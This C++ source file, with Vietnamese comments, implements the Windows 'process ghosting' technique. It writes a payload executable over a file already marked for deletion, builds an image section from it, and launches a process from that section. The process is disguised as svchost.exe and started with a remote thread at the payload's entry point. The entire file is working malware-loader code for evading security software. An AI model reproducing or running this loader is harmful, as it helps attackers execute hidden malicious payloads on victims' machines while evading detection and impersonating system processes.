// Process_Ghosting.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <UserEnv.h>

typedef struct _CP_INFO {
    HANDLE p_handle;
    PROCESS_BASIC_INFORMATION pb_info;
} CP_INFO, * PCP_INFO;
typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
}FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;
typedef enum _myFILE_INFORMATION_CLASS {
    mFileDirectoryInformation = 1,
    FileFullDirectoryInformation,   // 2
    FileBothDirectoryInformation,   // 3
    FileBasicInformation,           // 4
    FileStandardInformation,        // 5
    FileInternalInformation,        // 6
    FileEaInformation,              // 7
    FileAccessInformation,          // 8
    FileNameInformation,            // 9
    FileRenameInformation,          // 10
    FileLinkInformation,            // 11
    FileNamesInformation,           // 12
    FileDispositionInformation,     // 13 
    FilePositionInformation,        // 14 wdm
    FileFullEaInformation,          // 15
    FileModeInformation,            // 16
    FileAlignmentInformation,       // 17
    FileAllInformation,             // 18
    FileAllocationInformation,      // 19
    FileEndOfFileInformation,       // 20 wdm
    FileAlternateNameInformation,   // 21
    FileStreamInformation,          // 22
    FilePipeInformation,            // 23
    FilePipeLocalInformation,       // 24
    FilePipeRemoteInformation,      // 25
    FileMailslotQueryInformation,   // 26
    FileMailslotSetInformation,     // 27
    FileCompressionInformation,     // 28
    FileObjectIdInformation,        // 29
    FileCompletionInformation,      // 30
    FileMoveClusterInformation,     // 31
    FileQuotaInformation,           // 32
    FileReparsePointInformation,    // 33
    FileNetworkOpenInformation,     // 34
    FileAttributeTagInformation,    // 35
    FileTrackingInformation,        // 36
    FileIdBothDirectoryInformation, // 37
    FileIdFullDirectoryInformation, // 38
    FileValidDataLengthInformation, // 39
    FileShortNameInformation,       // 40
    FileIoCompletionNotificationInformation, // 41
    FileIoStatusBlockRangeInformation,       // 42
    FileIoPriorityHintInformation,           // 43
    FileSfioReserveInformation,              // 44
    FileSfioVolumeInformation,               // 45
    FileHardLinkInformation,                 // 46
    FileProcessIdsUsingFileInformation,      // 47
    FileMaximumInformation                   // 48
} myFILE_INFORMATION_CLASS;
typedef struct mPPEB_LDR_DATA {
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
}PEB_LDR_DATA1, * PPEB_LDR_DATA1;
typedef struct mPEB_FREE_BLOCK {
    struct mPEB_FREE_BLOCK* pNext;
    DWORD dwSize;
}PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;
typedef struct _UNICODE_STR
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;
typedef struct mPEB { // 65 elements, 0x210 bytes
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA1 pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;

}mPEB, * mPPEB;
typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT                  Flags;
    USHORT                  Length;
    ULONG                   TimeStamp;
    UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
typedef struct _CURDIR
{
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;
#define RTL_MAX_DRIVE_LETTERS 32
typedef struct _myRTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
    // ULONG LoaderThreads;
} mRTL_USER_PROCESS_PARAMETERS, * PmRTL_USER_PROCESS_PARAMETERS;
#define PS_INHERIT_HANDLES 0x00000004
#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001

typedef NTSTATUS(NTAPI* NtCreateSection_t) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* NtCreateProcessEx_t) (
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flag,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    BOOLEAN InheritHandles);
typedef NTSTATUS(NTAPI* NtSetInformationFile_t)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    myFILE_INFORMATION_CLASS FileInformationClass);
typedef NTSTATUS(NTAPI* RtlCreateProcessParametersEx_t)(
    PmRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrenDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
    );
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttr,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximummStackSize,
    PVOID AttributeList);
typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);
typedef void (WINAPI* RtlInitUnicodeString_t)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );
int main()
{
    // Lay ca API
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    NtCreateSection_t NtCreateSection = (NtCreateSection_t)GetProcAddress(ntdll, "NtCreateSection");
    NtCreateProcessEx_t NtCreateProcess = (NtCreateProcessEx_t)GetProcAddress(ntdll, "NtCreateProcess");
    NtSetInformationFile_t NtSetInformationFile = (NtSetInformationFile_t)GetProcAddress(ntdll, "NtSetInformationFile");
    RtlCreateProcessParametersEx_t RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t)GetProcAddress(ntdll, "RtlCreateProcessParametersEx");
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");
    NtQueryInformationProcess_t NtQueryInformationProc = (NtQueryInformationProcess_t)GetProcAddress(ntdll, "NtQueryInformationProcess");
    RtlInitUnicodeString_t RtlInitUnicodeStr = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");

    // Tao file handle voi flag CLOSE
    HANDLE hFile = CreateFileA(
        "notepad.exe",
        DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    // Thiet lap attribute cho file
    IO_STATUS_BLOCK io_status;
    RtlZeroMemory(&io_status, sizeof(io_status));
    
    FILE_DISPOSITION_INFORMATION fileDisInfor;
    fileDisInfor.DeleteFile = TRUE;

    myFILE_INFORMATION_CLASS fileInfor = FileDispositionInformation;

    NTSTATUS status = NtSetInformationFile(
        hFile,
        &io_status,
        &fileDisInfor,
        sizeof(fileDisInfor),
        fileInfor
    );

    // Read original file's content
    DWORD readSize, writeSize;

    HANDLE hMal = CreateFileA(
        "PEtoigian.exe",
        GENERIC_READ, 
        0, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
    readSize = GetFileSize(hMal, &writeSize);

    unsigned char* sByte = (unsigned char*)malloc(readSize);

    BOOL result = ReadFile(hMal, sByte, readSize, &writeSize, NULL);

    CloseHandle(hMal);

    // Overwrite payload len tren file ban dau
    result = WriteFile(hFile, sByte, readSize, &writeSize, NULL);

    // Tao section tu file moi
    HANDLE hSection = NULL;
    status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile);

    PIMAGE_DOS_HEADER dosHead = (PIMAGE_DOS_HEADER)sByte;
    PIMAGE_NT_HEADERS ntHead = (PIMAGE_NT_HEADERS)((ULONG_PTR)dosHead + dosHead->e_lfanew);
    ULONG_PTR rvaEntry = ntHead->OptionalHeader.AddressOfEntryPoint;

    free(sByte);

    // Dong File de xoa
    CloseHandle(hFile);
    // Tao process
    CP_INFO* pInfo = (PCP_INFO)malloc(sizeof(CP_INFO));
    RtlZeroMemory(pInfo, sizeof(CP_INFO));
    ULONG returnSize;
    NtCreateProcess(&(pInfo->p_handle), PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
    NtQueryInformationProc(pInfo->p_handle, ProcessBasicInformation, &(pInfo->pb_info), sizeof(PROCESS_BASIC_INFORMATION), &returnSize);

    mPEB peb = { 0 };
    ReadProcessMemory(pInfo->p_handle, pInfo->pb_info.PebBaseAddress, &peb, sizeof(peb), NULL);

    ULONG_PTR imageBase = (ULONG_PTR)peb.lpImageBaseAddress;
    ULONG_PTR entry = imageBase + rvaEntry;
    CloseHandle(hSection);
    //Assign process arguments and environment variables
    UNICODE_STRING imagePath;
    RtlInitUnicodeStr(&imagePath, L"C:\\windows\\system32\\svchost.exe");

    UNICODE_STRING dllDir;
    RtlInitUnicodeStr(&dllDir, L"C:\\Windows\\System32");
    // desktopInfo = NULL
    PmRTL_USER_PROCESS_PARAMETERS params = nullptr;
    status = RtlCreateProcessParametersEx(
        &params,
        &imagePath,
        &dllDir,
        NULL,
        &imagePath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );
    // Cap phat bo nho cho rpocess parameter.

    PVOID parameterBuffer = params;
    SIZE_T paramSize = params->EnvironmentSize + params->MaximumLength;
    status = NtAllocateVirtualMemory(pInfo->p_handle, &parameterBuffer, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Viet parameter vao process
    status = WriteProcessMemory(pInfo->p_handle, parameterBuffer, parameterBuffer, paramSize, NULL);

    PEB* remotePEB = (PEB*)pInfo->pb_info.PebBaseAddress;
    // Cap nhat dia chi cua process parameter vao PEB
    status = WriteProcessMemory(pInfo->p_handle, &remotePEB->ProcessParameters, &parameterBuffer, sizeof(PVOID), NULL);
    // Tu hoi handle truyen &(pInfo->p_handle) co dung khong?
    // Tao thread chay chuong trinh
    HANDLE hThread;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
        pInfo->p_handle, (LPTHREAD_START_ROUTINE)entry, NULL, FALSE, 0, 0, 0, NULL);
    if (NT_SUCCESS(status))
    {
        std::cout << "Tao thread thanh cong"<< std::endl;
    }

    system("pause");
    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
